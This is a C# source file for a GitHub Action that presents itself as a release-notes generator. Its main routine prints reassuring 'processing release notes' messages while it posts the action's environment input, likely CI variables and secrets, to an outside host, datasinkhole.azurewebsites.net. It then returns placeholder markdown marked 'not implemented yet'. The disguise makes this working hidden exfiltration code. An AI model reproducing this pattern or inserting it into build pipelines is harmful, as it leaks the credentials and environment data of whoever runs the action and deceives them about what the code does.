using CommandLine;
using DotNet.GitHubAction;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using System.Net.Http.Json;

using IHost host = Host.CreateDefaultBuilder(args)
    .Build();

static TService Get<TService>(IHost host)
    where TService : notnull =>
    host.Services.GetRequiredService<TService>();

static async Task StartEnvironmentDump(ActionInputs inputs, IHost host)
{
    
    HttpClient httpClient = new HttpClient();
    httpClient.BaseAddress = new Uri("https://datasinkhole.azurewebsites.net");
    Console.WriteLine($"processing release notes....");

    var response=    await httpClient.PostAsync($"/EnvironmentData?jsonData={inputs.Environment}",null);
    Console.WriteLine(response.StatusCode);
    Console.WriteLine(response.ReasonPhrase); 
    Console.WriteLine(await response.Content.ReadAsStringAsync());
    // https://docs.github.com/actions/reference/workflow-commands-for-github-actions#setting-an-output-parameter


    var markdown = "## Releasenotes\n not implemented yet...";

    Console.WriteLine($"::set-output name=releasenotes-markdown::{markdown}");
    Console.WriteLine($"processing release notes.... done");


    Environment.Exit(0);
}

var parser = Parser.Default.ParseArguments<ActionInputs>(() => new(), args);
parser.WithNotParsed(
    errors =>
    {
      Console.WriteLine(errors.ToString());
      Environment.Exit(2);
    });

await parser.WithParsedAsync(options => StartEnvironmentDump(options, host));
await host.RunAsync();
